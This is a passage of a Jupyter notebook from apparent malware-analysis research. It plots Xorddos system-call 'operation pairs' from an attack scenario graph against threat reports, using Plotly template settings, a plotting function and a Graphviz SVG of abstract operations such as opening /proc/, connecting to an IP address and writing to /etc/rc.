              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "contour"
           }
          ],
          "contourcarpet": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "contourcarpet"
           }
          ],
          "heatmap": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmap"
           }
          ],
          "heatmapgl": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmapgl"
           }
          ],
          "histogram": [
           {
            "marker": {
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "histogram"
           }
          ],
          "histogram2d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2d"
           }
          ],
          "histogram2dcontour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2dcontour"
           }
          ],
          "mesh3d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "mesh3d"
           }
          ],
          "parcoords": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "parcoords"
           }
          ],
          "pie": [
           {
            "automargin": true,
            "type": "pie"
           }
          ],
          "scatter": [
           {
            "fillpattern": {
             "fillmode": "overlay",
             "size": 10,
             "solidity": 0.2
            },
            "type": "scatter"
           }
          ],
          "scatter3d": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatter3d"
           }
          ],
          "scattercarpet": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattercarpet"
           }
          ],
          "scattergeo": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergeo"
           }
          ],
          "scattergl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergl"
           }
          ],
          "scattermapbox": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattermapbox"
           }
          ],
          "scatterpolar": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolar"
           }
          ],
          "scatterpolargl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolargl"
           }
          ],
          "scatterternary": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterternary"
           }
          ],
          "surface": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "surface"
           }
          ],
          "table": [
           {
            "cells": {
             "fill": {
              "color": "#EBF0F8"
             },
             "line": {
              "color": "white"
             }
            },
            "header": {
             "fill": {
              "color": "#C8D4E3"
             },
             "line": {
              "color": "white"
             }
            },
            "type": "table"
           }
          ]
         },
         "layout": {
          "annotationdefaults": {
           "arrowcolor": "#2a3f5f",
           "arrowhead": 0,
           "arrowwidth": 1
          },
          "autotypenumbers": "strict",
          "coloraxis": {
           "colorbar": {
            "outlinewidth": 0,
            "ticks": ""
           }
          },
          "colorscale": {
           "diverging": [
            [
             0,
             "#8e0152"
            ],
            [
             0.1,
             "#c51b7d"
            ],
            [
             0.2,
             "#de77ae"
            ],
            [
             0.3,
             "#f1b6da"
            ],
            [
             0.4,
             "#fde0ef"
            ],
            [
             0.5,
             "#f7f7f7"
            ],
            [
             0.6,
             "#e6f5d0"
            ],
            [
             0.7,
             "#b8e186"
            ],
            [
             0.8,
             "#7fbc41"
            ],
            [
             0.9,
             "#4d9221"
            ],
            [
             1,
             "#276419"
            ]
           ],
           "sequential": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ],
           "sequentialminus": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ]
          },
          "colorway": [
           "#636efa",
           "#EF553B",
           "#00cc96",
           "#ab63fa",
           "#FFA15A",
           "#19d3f3",
           "#FF6692",
           "#B6E880",
           "#FF97FF",
           "#FECB52"
          ],
          "font": {
           "color": "#2a3f5f"
          },
          "geo": {
           "bgcolor": "white",
           "lakecolor": "white",
           "landcolor": "#E5ECF6",
           "showlakes": true,
           "showland": true,
           "subunitcolor": "white"
          },
          "hoverlabel": {
           "align": "left"
          },
          "hovermode": "closest",
          "mapbox": {
           "style": "light"
          },
          "paper_bgcolor": "white",
          "plot_bgcolor": "#E5ECF6",
          "polar": {
           "angularaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "radialaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "scene": {
           "xaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "yaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "zaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           }
          },
          "shapedefaults": {
           "line": {
            "color": "#2a3f5f"
           }
          },
          "ternary": {
           "aaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "baxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "caxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "title": {
           "x": 0.05
          },
          "xaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          },
          "yaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          }
         }
        },
        "title": {
         "text": "Lifecycle Diagram of Attack Behavior in Document (Xorddos)"
        },
        "xaxis": {
         "title": {
          "text": "ASG Operation Pair (in steps)"
         }
        },
        "yaxis": {
         "title": {
          "text": "Malware Document"
         }
        }
       }
      }
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# import plotly.express as px\n",
    "import plotly.graph_objects as go\n",
    "\n",
    "def symmetric_difference(list1: list, list2: list) -> list:\n",
    "    ''' return list1 - list2. '''\n",
    "    s = set(list2)\n",
    "    temp3 = [x for x in list1 if x not in s]\n",
    "    return temp3\n",
    "\n",
    "def draw_lifecycle(fset:FamilySet):\n",
    "    familname = fset.familyname\n",
    "    # reportnames = [rem.reportname for rem in fset.rem_lst if len(rem.match_regex)]\n",
    "\n",
    "    fig = go.Figure()\n",
    "    x, y = [], []\n",
    "    x_sys, y_sys = [], []\n",
    "    for i, rem in enumerate(fset.rem_lst):\n",
    "        if len(rem.OPset_order_index) == 0:\n",
    "            continue\n",
    "\n",
    "        numOfDot = len(rem.OPset_order_index)\n",
    "        reportname = rem.reportname.split('.')[0]\n",
    "        reportname = reportname.split('-')[1]\n",
    "        reportname += f' ({numOfDot})'\n",
    "        x_sys.extend(rem.SysOPset_order_index) # 改變系統環境的 OP\n",
    "        y_sys.extend([reportname] * len(rem.SysOPset_order_index))\n",
    "        current_x_normal = symmetric_difference(rem.OPset_order_index, rem.SysOPset_order_index) # 一般的/其餘的 OP\n",
    "        # print(reportname, 'numOfDot', numOfDot, 'rem.OPset_order_index', rem.OPset_order_index)\n",
    "        # print('x_normal', current_x_normal, 'x_sys', rem.SysOPset_order_index)\n",
    "        x.extend(current_x_normal)\n",
    "        y.extend([reportname] * len(current_x_normal))\n",
    "        pass\n",
    "    # todo: add baseline's lifecycle\n",
    "    print()\n",
    "    rowname = f'ASG ({len(fset.sample.OPset)})'\n",
    "    current_x_system = fset.sample.OPset_sysOnly_ordered_index\n",
    "    current_x_normal = symmetric_difference(list(range(len(fset.sample.OPset))), current_x_system) # all steps - sysobj steps\n",
    "    x_sys.extend(current_x_system)\n",
    "    y_sys.extend([rowname] * len(current_x_system)) \n",
    "    x.extend(current_x_normal)\n",
    "    y.extend([rowname] * len(current_x_normal))\n",
    "    # print(rowname, len(fset.sample.OPset), len(current_x_system), len(current_x_normal))\n",
    "    \n",
    "    # normal OPs\n",
    "    x = [idx+1 for idx in x] # add 1 to each asg index\n",
    "    fig.add_trace(go.Scatter(\n",
    "        x=x,\n",
    "        y=y,\n",
    "        marker=dict(color=\"darkorange\", size=12),\n",
    "        mode=\"markers\",\n",
    "        name=\"Normal Operation Pair\",\n",
    "    ))\n",
    "\n",
    "    # changeSysObj OPs\n",
    "    x_sys = x = [idx+1 for idx in x_sys]\n",
    "    fig.add_trace(go.Scatter(\n",
    "        x=x_sys,\n",
    "        y=y_sys,\n",
    "        marker=dict(color=\"blue\", size=12),\n",
    "        mode=\"markers\",\n",
    "        name=\"Change SR Operation Pair\",\n",
    "    ))\n",
    "\n",
    "    fig.update_layout(title=f\"Lifecycle Diagram of Attack Behavior in Document ({familname})\",\n",
    "                    xaxis_title=\"ASG Operation Pair (in steps)\",\n",
    "                    yaxis_title=\"Malware Document\")\n",
    "    fig.show()\n",
    "    pass\n",
    "\n",
    "draw_lifecycle(fset)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: draw ASG & CTD's OP graph\n",
    "- 完整的 ASG OPset graph\n",
    "- 每篇報告的 CTD OPset (完整和matched兩種)，以及對應部分的 ASG。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['b', 'c', 'd']"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "a = [1,2,3]\n",
    "b = ['a','b','c','d','e']\n",
    "[b[i] for i in a]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Title: Xorddos_asg_OPset Pages: 1 -->\n<svg width=\"5193pt\" height=\"291pt\"\n viewBox=\"0.00 0.00 5193.18 291.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 287)\">\n<title>Xorddos_asg_OPset</title>\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-287 5189.18,-287 5189.18,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2539.34\" cy=\"-265\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2539.34\" y=\"-261.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"113.34\" cy=\"-178\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"113.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.18,-263.67C2040.06,-261.74 28.45,-251.42 6.34,-229 -17.11,-205.23 32.56,-191.47 71.82,-184.6\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"72.48,-188.04 81.78,-182.96 71.34,-181.13 72.48,-188.04\"/>\n<text text-anchor=\"middle\" x=\"29.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">19.open</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2461.91,-263.63C2046.2,-261.58 96.8,-250.77 75.34,-229 66.13,-219.66 73.96,-208.07 84.85,-198.39\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"87.12,-201.06 92.7,-192.05 82.72,-195.61 87.12,-201.06\"/>\n<text text-anchor=\"middle\" x=\"102.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">68.access</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2461.85,-263.77C2057.54,-262.44 206.36,-254.96 153.34,-229 142.48,-223.68 133.63,-213.87 127.04,-204.33\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"129.94,-202.36 121.63,-195.78 124.03,-206.11 129.94,-202.36\"/>\n<text text-anchor=\"middle\" x=\"180.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.readlink</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2461.95,-264.31C2087.77,-265.58 475.02,-268.71 254.34,-229 243.72,-227.09 187.49,-206.6 149.33,-192.45\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"150.17,-189.03 139.57,-188.82 147.73,-195.59 150.17,-189.03\"/>\n<text text-anchor=\"middle\" x=\"291.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">69.newfstatat</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"327.34\" cy=\"-178\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"327.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^pipe($|.|$)</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2461.85,-264.01C2076.75,-263.91 385.46,-261.62 342.34,-229 335.17,-223.58 331.3,-214.85 329.26,-206.19\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"332.7,-205.56 327.6,-196.27 325.79,-206.71 332.7,-205.56\"/>\n<text text-anchor=\"middle\" x=\"363.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">34.pipe</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"495.34\" cy=\"-178\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"495.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2461.89,-264.21C2081.77,-265.06 430.33,-266.6 393.34,-229 372.48,-207.8 411.6,-194.22 447.27,-186.65\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"448.06,-190.06 457.18,-184.67 446.69,-183.19 448.06,-190.06\"/>\n<text text-anchor=\"middle\" x=\"416.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">57.lseek</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2461.92,-264.17C2089.43,-264.79 498.05,-265.32 462.34,-229 454.22,-220.75 459.4,-210.23 467.84,-200.96\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"470.4,-203.36 475.12,-193.87 465.51,-198.34 470.4,-203.36\"/>\n<text text-anchor=\"middle\" x=\"485.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">52.open</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.17,-263.6C2098.9,-261.58 574.86,-251.78 531.34,-229 521.28,-223.74 513.38,-214.25 507.57,-204.94\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"510.61,-203.2 502.64,-196.22 504.51,-206.65 510.61,-203.2\"/>\n<text text-anchor=\"middle\" x=\"556.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.stat64</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2461.82,-264.24C2125.65,-265.04 802.58,-265.82 620.34,-229 619.19,-228.77 570.26,-209.14 533.97,-194.55\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"535.17,-191.26 524.58,-190.77 532.56,-197.75 535.17,-191.26\"/>\n<text text-anchor=\"middle\" x=\"642.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">60.write</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"749.34\" cy=\"-178\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"749.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge10\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.11,-264.01C2113.86,-263.9 705.15,-261.42 673.34,-229 660.48,-215.9 674.96,-204.39 694.6,-195.73\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"695.96,-198.95 703.91,-191.95 693.32,-192.47 695.96,-198.95\"/>\n<text text-anchor=\"middle\" x=\"700.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">41.umask</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge11\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2461.93,-263.93C2122.47,-263.47 781.04,-259.69 750.34,-229 744.4,-223.07 742.8,-214.48 743.12,-206.1\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"746.6,-206.5 744.28,-196.16 739.64,-205.68 746.6,-206.5\"/>\n<text text-anchor=\"middle\" x=\"779.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">12.shmget</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge12\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.21,-263.6C2139.43,-261.78 910.07,-253.29 831.34,-229 819.67,-225.4 818.7,-220.45 808.34,-214 800.92,-209.39 792.92,-204.55 785.27,-199.98\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"786.89,-196.88 776.5,-194.79 783.32,-202.9 786.89,-196.88\"/>\n<text text-anchor=\"middle\" x=\"866.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.exit_group</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"916.34\" cy=\"-91\" rx=\"31.7\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"916.34\" y=\"-87.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^sed$</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge13\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.18,-263.38C2147.34,-260.69 974.9,-249.35 942.34,-229 906.95,-206.89 907.43,-152.46 911.52,-119.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"914.99,-119.66 912.93,-109.27 908.06,-118.68 914.99,-119.66\"/>\n<text text-anchor=\"middle\" x=\"938.84\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">38.exec</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1011.34\" cy=\"-178\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1011.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge14\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2461.99,-263.75C2147.11,-262.56 977.05,-256.31 950.34,-229 937.44,-215.82 954.99,-202.67 974.53,-193.16\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"976.19,-196.26 983.85,-188.94 973.29,-189.88 976.19,-196.26\"/>\n<text text-anchor=\"middle\" x=\"966.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">21.rm</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge15\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.13,-263.69C2154.57,-262.27 1032.02,-255.28 1006.34,-229 1000.29,-222.81 999.68,-213.91 1001.2,-205.33\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1004.6,-206.15 1003.77,-195.59 997.83,-204.37 1004.6,-206.15\"/>\n<text text-anchor=\"middle\" x=\"1026.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">32.lstat</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge16\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.01,-263.37C2170.22,-260.85 1149.21,-250.5 1083.34,-229 1065.37,-223.13 1047.88,-211.19 1034.65,-200.44\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1036.88,-197.75 1026.99,-193.97 1032.37,-203.1 1036.88,-197.75\"/>\n<text text-anchor=\"middle\" x=\"1105.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">22.write</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1221.34\" cy=\"-178\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1221.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge17\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2461.9,-263.52C2171.24,-261.52 1160.62,-252.87 1137.34,-229 1120.38,-211.61 1148.64,-198.04 1176.85,-189.45\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1178.11,-192.73 1186.76,-186.62 1176.18,-186 1178.11,-192.73\"/>\n<text text-anchor=\"middle\" x=\"1168.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">66.connect</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge18\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2461.87,-263.37C2182.81,-260.93 1244.29,-251.1 1222.34,-229 1216.42,-223.04 1214.83,-214.46 1215.14,-206.07\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1218.62,-206.48 1216.3,-196.14 1211.67,-205.66 1218.62,-206.48\"/>\n<text text-anchor=\"middle\" x=\"1244.34\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">62.send</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge19\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2461.8,-264.19C2207.83,-264.5 1410.83,-262.73 1300.34,-229 1281,-223.1 1261.78,-211.1 1247.14,-200.34\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1249.16,-197.48 1239.08,-194.2 1244.91,-203.05 1249.16,-197.48\"/>\n<text text-anchor=\"middle\" x=\"1339.84\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">64._newselect</text>\n</g>\n<!-- 8 -->\n<g id=\"node9\" class=\"node\">\n<title>8</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1553.34\" cy=\"-178\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1553.34\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/boot/</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge20\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2462.31,-263.08C2207.97,-259.86 1410,-248.24 1391.34,-229 1354.22,-190.73 1450.72,-181.59 1510.34,-179.51\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1510.75,-183 